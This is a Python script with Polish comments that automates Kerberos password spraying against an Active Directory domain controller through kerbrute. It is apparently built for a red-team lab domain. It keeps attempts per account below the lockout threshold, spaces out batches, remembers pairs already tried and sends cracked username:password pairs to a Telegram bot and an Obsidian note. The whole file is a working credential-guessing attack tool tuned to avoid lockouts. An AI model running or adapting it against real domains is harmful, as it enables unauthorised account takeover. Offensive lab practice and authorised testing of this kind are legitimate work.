#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""password_spray.py — kerbrute password spray z bezpiecznikiem (lockout).

Wrapper na `kerbrute passwordspray` (wzorzec: Lab/RedTeam_AD/Playbook_AD.md),
z twardymi limitami, zeby nie zablokowac kont na DC:

  - limit prob na konto:  min(--max-per-user, --lockout-threshold - --margin)
  - przerwa --delay miedzy partiami haseł (jedno haslo = jedna partia na
    wszystkich uzytkownikow)
  - kapitał bezpieczenstwa --margin pod progiem lockoutu DC
  - dedupe: pary user:haslo juz sprawdzone nie sa powtarzane (plik stanu)
  - alert Telegram przy trafieniu (wzorzec alert_roles.py)

Wynik: karta Obsidian <out>/Spray_<domain>_<YYYY-MM-DD>.md + stan JSON.

Uzycie:
  python3 password_spray.py --domain xmask.lab --dc 10.10.0.2 \\
      --users /tmp/users.txt --password 'LabPass2026'
  python3 password_spray.py --domain xmask.lab --dc 10.10.0.2 \\
      --users /tmp/users.txt --passwords hasla.txt --delay 60
  python3 password_spray.py --domain xmask.lab --dc 10.10.0.2 \\
      --users /tmp/users.txt --password 'X' --dry-run   # plan bez wykonania

Env:
  KALI_CONTAINER       kontener z kerbrute (domyslnie "kali")
  SPRAY_ENV            plik .env bota Telegram (domyslnie /root/obsidian-telegram-bot/.env)
  SPRAY_STATE_DIR      katalog stanu (domyslnie /root/obsidian-spray-state)
  OBSIDIAN_VAULT       vault (auto-wykrywany)
  TELEGRAM_BOT_TOKEN / ALLOWED_USER_IDS — jesli nie ma pliku .env
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
KALI_CONTAINER = os.environ.get("KALI_CONTAINER", "kali")
STATE_DIR = Path(os.environ.get("SPRAY_STATE_DIR", "/root/obsidian-spray-state"))
ENV_FILE = Path(os.environ.get("SPRAY_ENV", "/root/obsidian-telegram-bot/.env"))
OWNER_FILE = Path("/root/obsidian-telegram-bot/.owner_id")
DEFAULT_LOCKOUT_THRESHOLD = 3   # bezpieczny domysl — wez realny z `net accounts` na DC
DEFAULT_MARGIN = 1              # prob poniżej progu lockoutu
DEFAULT_DELAY = 60              # s miedzy partiami haseł


def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def log(msg: str) -> None:
    print(f"[*] {msg}", flush=True)


def err(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr, flush=True)


# ---------------------------------------------------------------- narzedzie

def find_kerbrute() -> list[str] | None:
    if shutil.which("kerbrute"):
        return []
    if shutil.which("docker"):
        probe = subprocess.run(
            ["docker", "exec", KALI_CONTAINER, "sh", "-lc", "command -v kerbrute"],
            capture_output=True, text=True, timeout=30)
        if probe.returncode == 0:
            return ["docker", "exec", KALI_CONTAINER]
    return None


# ---------------------------------------------------------------- stan

def state_path(domain: str) -> Path:
    return STATE_DIR / f"spray_{domain}.json"


def load_state(domain: str) -> dict:
    p = state_path(domain)
    if p.is_file():
        try:
            d = json.loads(p.read_text(encoding="utf-8"))
            if isinstance(d, dict):
                d.setdefault("users", {})
                return d
        except json.JSONDecodeError:
            pass
    return {"users": {}, "runs": []}


def save_state(domain: str, state: dict) -> None:
    p = state_path(domain)
    p.parent.mkdir(parents=True, exist_ok=True)
    tmp = p.with_suffix(".json.tmp")
    tmp.write_text(json.dumps(state, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    tmp.replace(p)


# ---------------------------------------------------------------- telegram

def load_env(path: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    if not path.is_file():
        return out
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        k, v = line.split("=", 1)
        out[k.strip()] = v.strip().strip('"').strip("'")
    return out


def chat_ids(env: dict[str, str]) -> list[int]:
    ids: list[int] = []
    for part in (env.get("ALLOWED_USER_IDS") or "").split(","):
        part = part.strip()
        if part.isdigit():
            ids.append(int(part))
    if OWNER_FILE.is_file():
        text = OWNER_FILE.read_text(encoding="utf-8").strip()
        if text.isdigit() and int(text) not in ids:
            ids.append(int(text))
    return ids


def send_telegram(token: str, chat_id: int, html: str) -> None:
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    body = urllib.parse.urlencode({
        "chat_id": str(chat_id), "text": html, "parse_mode": "HTML",
        "disable_web_page_preview": "true"}).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    with urllib.request.urlopen(req, timeout=15) as resp:
        resp.read()


def _esc(text: str) -> str:
    return (str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))


def notify(token: str, ids: list[int], html: str) -> None:
    if not token or not ids:
        return
    for chat in ids:
        try:
            send_telegram(token, chat, html)
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            err(f"telegram fail: {exc}")


# ---------------------------------------------------------------- kerbrute

def run_kerbrute(prefix: list[str], domain: str, dc: str, users_file: Path,
                 password: str, dry: bool) -> tuple[int, str]:
    cmd = prefix + ["kerbrute", "passwordspray", "-d", domain,
                    "--dc", dc, str(users_file), password]
    if dry:
        log("  $ " + " ".join(f"'{c}'" if " " in c else c for c in cmd))
        return 0, ""
    log("  $ " + " ".join(f"'{c}'" if " " in c else c for c in cmd))
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
    except subprocess.TimeoutExpired:
        return 124, ""
    return r.returncode, (r.stdout or "") + (r.stderr or "")


def parse_kerbrute(out: str) -> tuple[list[tuple[str, str]], list[str]]:
    """Zwraca (trafienia [(user, pass)], uwagi/ostrzezenia)."""
    hits: list[tuple[str, str]] = []
    warns: list[str] = []
    for line in out.splitlines():
        if "VALID LOGIN" in line:
            m = re.search(r"VALID LOGIN:\s*([^@:\s]+)@\S+:\s*(.+)$", line)
            if m:
                hits.append((m.group(1).strip(), m.group(2).strip()))
        elif re.search(r"(locked|lockout|KDC_ERR_|CLOCK_SKEW|REJECTED)", line, re.I):
            warns.append(line.strip())
    return hits, warns


# ---------------------------------------------------------------- obsidian

def find_vault() -> Path:
    env = os.environ.get("OBSIDIAN_VAULT")
    if env:
        return Path(env)
    p = HERE
    for _ in range(6):
        if (p / "Daily").is_dir() and (p / "Narzedzia").is_dir():
            return p
        p = p.parent
    return Path.home() / "obsidian-vault"


def write_card(out_dir: Path, domain: str, dc: str, cfg: dict, rows: list[dict],
               hits: list[tuple[str, str]], dry: bool) -> Path:
    today = datetime.now().strftime("%Y-%m-%d")
    card = out_dir / f"Spray_{domain}_{today}.md"
    if dry:
        return card
    L: list[str] = []
    L.append("---")
    L.append(f'title: "Spray {domain} ({today})"')
    L.append(f"date: {today}")
    L.append("tags: [lab, redteam, ad, spray, auto]")
    L.append(f"domain: {domain}")
    L.append(f"dc: {dc}")
    L.append("status: active")
    L.append("---")
    L.append("")
    L.append(f"# Spray {domain} — {today}")
    L.append("")
    L.append(f"> Wygenerowano: {utc_now()} · `password_spray.py` z bezpiecznikiem.")
    L.append("")
    L.append("## Wynik")
    L.append("")
    if hits:
        L.append("### ✅ Trafienia")
        L.append("")
        L.append("| Użytkownik | Hasło |")
        L.append("|------------|-------|")
        for u, p in hits:
            L.append(f"| `{u}` | `{p}` |")
        L.append("")
    else:
        L.append("_Brak trafień w tej rundzie._")
        L.append("")
    L.append("## Podsumowanie")
    L.append("")
    L.append("| Użytkownicy | Hasła (partie) | Próby/konto |")
    L.append("|------------:|---------------:|------------:|")
    L.append(f"| {cfg['n_users']} | {cfg['n_passwords']} | {cfg['attempts_per_user']} |")
    L.append("")
    L.append("## Bezpiecznik (konfiguracja)")
    L.append("")
    L.append("| Parametr | Wartość |")
    L.append("|----------|---------|")
    L.append(f"| Próg lockoutu DC | {cfg['lockout_threshold']} |")
    L.append(f"| Margines | {cfg['margin']} |")
    L.append(f"| Max prób/konto (wykonane) | {cfg['attempts_per_user']} |")
    L.append(f"| Opóźnienie między partiami | {cfg['delay']} s |")
    L.append(f"| DC | {dc} |")
    L.append("")
    L.append("## Szczegóły")
    L.append("")
    for r in rows:
        mark = "✅" if r["status"] == "VALID" else ("⚠️" if r["status"] == "WARN" else "—")
        L.append(f"- {mark} `{r['user']}` ← `{r['password']}` ({r['time']})")
    L.append("")
    L.append("## Uwagi OPSEC")
    L.append("")
    L.append("- Po trafieniu: zmień hasło wg polityki / zgłoś jako dowód.")
    L.append("- Lockout: `net accounts` na DC pokazuje realny próg (tu użyto "
             "wartości konfigurowanej).")
    L.append("")
    tmp = card.with_suffix(".md.tmp")
    tmp.write_text("\n".join(L), encoding="utf-8")
    tmp.replace(card)
    return card


# ---------------------------------------------------------------- main

def main() -> int:
    ap = argparse.ArgumentParser(
        description="kerbrute password spray z bezpiecznikiem lockout.")
    ap.add_argument("--domain", required=True, help="domena (np. xmask.lab)")
    ap.add_argument("--dc", required=True, help="adres DC")
    ap.add_argument("--users", required=True, help="plik z loginami (1/linia)")
    ap.add_argument("--password", help="pojedyncze hasło")
    ap.add_argument("--passwords", help="plik z hasłami (1/linia)")
    ap.add_argument("--password-list", help="hasła po przecinku")
    ap.add_argument("--delay", type=int, default=DEFAULT_DELAY,
                    help="przerwa (s) między partiami haseł")
    ap.add_argument("--max-per-user", type=int, default=1,
                    help="maks. haseł na konto w tym wywołaniu")
    ap.add_argument("--lockout-threshold", type=int, default=DEFAULT_LOCKOUT_THRESHOLD,
                    help="próg lockoutu DC (net accounts); domyślnie 3")
    ap.add_argument("--margin", type=int, default=DEFAULT_MARGIN,
                    help="próby poniżej progu (bezpiecznik)")
    ap.add_argument("--out", help="katalog kart Obsidian (domyślnie <vault>/Lab/RedTeam_AD)")
    ap.add_argument("--no-telegram", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args()

    passwords: list[str] = []
    if a.password:
        passwords.append(a.password)
    if a.passwords and Path(a.passwords).is_file():
        passwords += [l.strip() for l in Path(a.passwords).read_text(errors="replace")
                      .splitlines() if l.strip() and not l.startswith("#")]
    if a.password_list:
        passwords += [p.strip() for p in a.password_list.split(",") if p.strip()]
    passwords = [p for p in dict.fromkeys(passwords)]  # dedupe, zachowaj kolejnosc
    if not passwords:
        err("podaj --password, --passwords albo --password-list")
        return 2

    users_file = Path(a.users)
    if not users_file.is_file():
        err(f"brak pliku uzytkownikow: {users_file}")
        return 2
    users = [l.strip() for l in users_file.read_text(errors="replace").splitlines()
             if l.strip() and not l.startswith("#")]
    if not users:
        err("plik uzytkownikow jest pusty")
        return 2

    # --- bezpiecznik
    attempts_per_user = min(a.max_per_user, a.lockout_threshold - a.margin)
    if attempts_per_user < 1:
        err(f"bezpiecznik: threshold({a.lockout_threshold}) - margin({a.margin}) "
            "daje 0 prob — podnieś threshold albo zmniejsz margin")
        return 3
    cfg = {"n_users": len(users), "n_passwords": len(passwords),
           "attempts_per_user": attempts_per_user, "delay": a.delay,
           "lockout_threshold": a.lockout_threshold, "margin": a.margin}

    prefix = find_kerbrute()
    if not prefix and not a.dry_run:
        err("brak kerbrute (PATH ani kontener Kali) — zainstaluj albo ustaw KALI_CONTAINER")
        return 3

    vault = find_vault()
    out_dir = Path(a.out) if a.out else vault / "Lab" / "RedTeam_AD"
    out_dir.mkdir(parents=True, exist_ok=True)
    state = load_state(a.domain)

    print(f"\n=== Password spray {a.domain} (DC {a.dc}) ===")
    print(f"  uzytkownikow: {len(users)} | hasel: {len(passwords)}")
    print(f"  prob/konto:   {attempts_per_user} (threshold={a.lockout_threshold}, "
          f"margin={a.margin})")
    print(f"  opoznienie:   {a.delay}s miedzy partiami")
    if a.dry_run:
        print("\nPlan (dry-run):")
        for p in passwords[:attempts_per_user]:
            run_kerbrute([], a.domain, a.dc, users_file, p, dry=True)
        print("\nUWAGA: dry-run nic nie wykonuje.")
        return 0

    env = load_env(ENV_FILE)
    for k, v in env.items():
        os.environ.setdefault(k, v)
    token = (env.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or "").strip()
    ids = chat_ids(env)
    tg = not a.no_telegram

    # --- wykonanie
    rows: list[dict] = []
    hits: list[tuple[str, str]] = []
    aborted = False
    attempted = 0
    start = utc_now()

    if tg:
        notify(token, ids,
               f"🔑 <b>Spray {_esc(a.domain)}</b> start\n"
               f"konta: {len(users)} · partie: {attempts_per_user} · "
               f"delay: {a.delay}s · próg lockoutu: {a.lockout_threshold}")

    for pw in passwords[:attempts_per_user]:
        # skip haseł juz sprawdzonych dla WSZYSTKICH uzytkownikow w stanie
        pending = [u for u in users
                   if pw not in (state["users"].get(u, {}).get("verified") or [])]
        if not pending:
            log(f"haslo {pw!r} juz sprawdzone dla wszystkich kont — pomijam")
            continue
        if attempted and a.delay:
            log(f"przerwa {a.delay}s ...")
            time.sleep(a.delay)

        rc, out = run_kerbrute(prefix, a.domain, a.dc, users_file, pw, dry=False)
        attempted += 1
        batch_hits, warns = parse_kerbrute(out)
        for u, p in batch_hits:
            hits.append((u, p))
            rows.append({"user": u, "password": p, "status": "VALID", "time": utc_now()})
            state["users"].setdefault(u, {"verified": [], "attempts": 0})
            if p not in state["users"][u]["verified"]:
                state["users"][u]["verified"].append(p)
            if tg:
                notify(token, ids,
                       f"⚠️ <b>VALID LOGIN</b> {_esc(a.domain)}\n"
                       f"<code>{_esc(u)}:{_esc(p)}</code>")
        for u in pending:
            state.setdefault("users", {})
            st = state["users"].setdefault(u, {"verified": [], "attempts": 0})
            st["attempts"] = st.get("attempts", 0) + 1
        for w in warns:
            err("UWAGA kerbrute: " + w)
            rows.append({"user": "-", "password": pw, "status": "WARN", "time": utc_now()})
            if re.search(r"locked|lockout", w, re.I):
                aborted = True
                break
        if rc == 124:
            err("kerbrute timeout — przerywam (bezpiecznik)")
            aborted = True
        if aborted:
            break

    state["runs"].append({"start": start, "end": utc_now(),
                          "passwords": passwords[:attempts_per_user],
                          "hits": [list(h) for h in hits], "aborted": aborted})
    save_state(a.domain, state)

    card = write_card(out_dir, a.domain, a.dc, cfg, rows, hits, dry=False)
    rel = str(card)
    try:
        rel = str(card.resolve().relative_to(vault.resolve()))
    except ValueError:
        pass
    print(f"\nWynik: {len(hits)} trafien | prob: {attempted} | abort: {aborted}")
    for u, p in hits:
        print(f"  ✅ {u}:{p}")
    print(f"karta: {card}")

    if tg:
        hit_html = "".join(f"\n<code>{_esc(u)}:{_esc(p)}</code>" for u, p in hits) or " brak"
        notify(token, ids,
               f"🔑 <b>Spray {_esc(a.domain)}</b> koniec\n"
               f"trafienia:{hit_html}\n"
               f'<a href="obsidian://open?vault={vault.name}&file={rel}">Karta Obsidian</a>')
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
